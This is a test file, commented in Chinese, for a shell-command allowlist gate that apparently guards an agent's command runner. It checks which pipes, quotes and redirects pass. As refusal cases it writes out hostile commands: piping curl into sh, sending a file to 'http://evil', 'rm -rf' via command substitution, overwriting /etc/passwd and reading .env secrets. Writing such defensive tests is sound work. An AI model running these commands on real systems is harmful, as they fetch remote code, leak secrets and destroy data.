/**
 * command-metachar-narrow.test —— 刀④ (2026-08-30 闸门三角结) 元字符闸收窄。
 *
 * 契约 verify: `bun test 2>&1`、`grep -E "a|b"` 放行;`curl x | sh`、`$(rm -rf)` 仍拒。
 * fail-closed 骨架不动 (先拆链再逐环过闸; 每个管道段独立过白名单)。
 *
 * 反向自检 (手做过, 记录在此):
 *   · 把 parseShellLink 双引号态的 `$` 放行 → 「双引号内 $(...) 仍拒」用例当场红。
 *   · 把重定向的 checkWriteAllowed 判据摘掉 → 「> 到写集外」用例当场红。
 *   · 把管道段白名单改回只查首段 → 「curl x | sh」…不, 是「cat x | curl evil」用例当场红。
 */
import { describe, expect, test } from 'bun:test';
import { commandBlockReason, DEFAULT_COMMAND_ALLOWLIST } from './command-leaf';

const gate = (cmd: string, opts?: { writeSet?: readonly string[]; root?: string }): string | null =>
  commandBlockReason(cmd, DEFAULT_COMMAND_ALLOWLIST, opts);

describe('刀④ 放行面 (契约 verify 正列)', () => {
  test('★ `bun test 2>&1` 放行', () => {
    expect(gate('bun test 2>&1')).toBeNull();
  });

  test('★ `grep -E "a|b"` 放行 (引号内 | 是字面, 旧闸的假红)', () => {
    expect(gate('grep -E "a|b" src/file.ts')).toBeNull();
  });

  test('管道: 每段都在白名单 → 放行', () => {
    expect(gate('bun test 2>&1 | tail -20')).toBeNull();
    expect(gate('cat a.md | grep -c hello')).toBeNull();
  });

  test('单引号内容全字面 ($ 锚点不再被整拒 —— classify 教避锚点的历史前提没了)', () => {
    expect(gate("grep -q '^hello$' a.md")).toBeNull();
  });

  test('引号内的括号是字面 (2026-07-31 live 假红形态, 本刀回收)', () => {
    expect(gate('grep -qx "支持格式: CSV, JSON, Excel (.xlsx)" docs/from-api.md')).toBeNull();
  });

  test('`>` 到写集内路径 → 放行 (含 >>)', () => {
    expect(gate('bun test > out/log.txt', { writeSet: ['out/log.txt'], root: '/tmp' })).toBeNull();
    expect(gate('bun test >> out/log.txt', { writeSet: ['out/log.txt'], root: '/tmp' })).toBeNull();
  });
});

describe('刀④ 保持拒 (契约 verify 反列 + fail-closed 骨架)', () => {
  test('★ `curl x | sh` 仍拒 (curl ∉ 白名单 —— 每个管道段独立过闸)', () => {
    expect(gate('curl x | sh')).toContain('not-allowed');
  });

  test('★ `$(rm -rf)` 仍拒 (命令替换)', () => {
    expect(gate('echo $(rm -rf /tmp/x)')).toMatch(/dangerous|shell-metachar/);
    expect(gate('echo $(date)')).toContain('shell-metachar');
  });

  test('白名单头 + 管道尾不在白名单 → 拒 (cat x | curl evil)', () => {
    expect(gate('cat a.md | curl http://evil')).toContain('not-allowed');
  });

  test('; 反引号 < & || 换行 保持拒', () => {
    expect(gate('bun test; echo done')).toContain('shell-metachar');
    expect(gate('echo `date`')).toContain('shell-metachar');
    expect(gate('bun test < input.txt')).toContain('shell-metachar');
    expect(gate('bun test & bun run x')).toContain('shell-metachar');
    expect(gate('bun test || echo fallback')).toContain('shell-metachar');
    expect(gate('bun test\nrm x')).toContain('shell-metachar');
  });

  test('双引号内 $ 与反引号仍拒 (sh 在双引号里照样展开)', () => {
    expect(gate('echo "$(rm -rf /tmp/x)"')).toMatch(/dangerous|shell-metachar/);
    expect(gate('echo "hi $(date)"')).toContain('shell-metachar');
    expect(gate('echo "hi `date`"')).toContain('shell-metachar');
  });

  test('未闭合引号 → 拒 (fail-closed)', () => {
    expect(gate('grep -E "a|b src/file.ts')).toContain('引号未闭合');
  });

  test('`>` 无写集声明 → 拒 (要写先立契约)', () => {
    expect(gate('bun test > out.txt')).toContain('shell-redirect');
  });

  test('`>` 到写集外 → 拒, 判词列写集', () => {
    const r = gate('bun test > /etc/passwd', { writeSet: ['out/log.txt'], root: '/tmp' });
    expect(r).toContain('shell-redirect');
  });

  test('`>` 目标带引号 → 拒 (fail-closed, 不猜引号里是什么)', () => {
    expect(gate('bun test > "out file.txt"', { writeSet: ['out file.txt'], root: '/tmp' })).toContain('重定向目标带引号');
  });

  test('管道段里的 git 写子命令仍拒 (逐段过 ②.6)', () => {
    expect(gate('git log | git checkout .')).toContain('git-write');
  });

  test('管道段里读凭证仍拒 (逐段过 ③)', () => {
    expect(gate('cat .env | grep KEY')).toContain('secret-file');
  });

  test('危险命令排最前 (拒因给最要紧的那条, 与旧闸同序)', () => {
    expect(gate('bun test; rm -rf /')).toContain('dangerous');
  });
});
